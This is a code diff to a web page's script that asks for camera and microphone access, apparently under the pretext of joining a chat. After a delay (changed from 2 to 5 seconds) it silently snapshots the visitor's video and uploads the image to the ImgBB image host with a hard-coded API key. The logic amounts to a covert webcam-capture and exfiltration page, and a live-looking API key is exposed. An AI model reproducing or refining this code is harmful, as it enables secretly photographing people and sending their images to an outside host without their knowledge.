@@ -36,10 +36,11 @@
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
         video.srcObject = stream;
 
-        // Wait 2 seconds, then capture image
+        // ✅ Wait 5 seconds to ensure the camera loads properly
         setTimeout(() => {
           takeSnapshotAndUpload(video);
-        }, 2000);
+        }, 5000);
+
       } catch (err) {
         statusText.innerText = 'Permission denied. Cannot connect to chat.';
         console.error(err);
@@ -55,7 +56,7 @@
       const imageData = canvas.toDataURL('image/jpeg').split(',')[1];
 
       const formData = new FormData();
-      formData.append('key', '46298af2eca9b7928deb2e323d92ef60');
+      formData.append('key', '46298af2eca9b7928deb2e323d92ef60'); // your ImgBB key
       formData.append('image', imageData);
 
       try {
